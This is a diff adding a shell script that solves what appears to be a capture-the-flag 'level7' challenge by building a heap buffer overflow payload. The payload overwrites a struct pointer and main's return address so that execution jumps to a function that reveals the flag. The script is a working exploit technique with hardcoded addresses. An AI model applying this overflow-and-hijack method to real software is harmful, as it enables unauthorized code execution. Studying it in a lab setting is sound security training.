@@ -1,0 +1,37 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# 'main' function uses 'strcpy'
+# We can use a heap buffer overflow to overwrite 'arg2.str'
+# We set 'arg2.str' to the address where the main return address is stored
+# 'strcpy(arg2.str, argv[2])' is then used to set the main return address to 'm'
+
+# We fill the buffer
+BUFFER_SIZE=8
+BUFFER_FILLER="$(put "${BUFFER_SIZE}" A)"
+
+# We fill the malloc header
+MALLOC_HEADER_SIZE=8
+MALLOC_HEADER_FILLER="$(put "${MALLOC_HEADER_SIZE}" A)"
+
+# We fill 'arg2.n'
+ARG2N_SIZE=4
+ARG2N_FILLER="$(put "${ARG2N_SIZE}" A)"
+
+# We overwrite 'arg2.str' with the address where the main return address is stored
+MAIN_RET_STORE_ADDRESS="bffff73c"
+ARG2STR_REPLACEMENT="$(hex_little_endian "${MAIN_RET_STORE_ADDRESS}")"
+
+# We set the main return address to 'm'
+M_ADDRESS="080484f4"
+MAIN_RET_REPLACEMENT="$(hex_little_endian "${M_ADDRESS}")"
+
+# Calling 'n' gives the flag
+PAYLOAD="${BUFFER_FILLER}${MALLOC_HEADER_FILLER}${ARG2N_FILLER}${ARG2STR_REPLACEMENT}"
+./level7 "${PAYLOAD}" "${MAIN_RET_REPLACEMENT}"
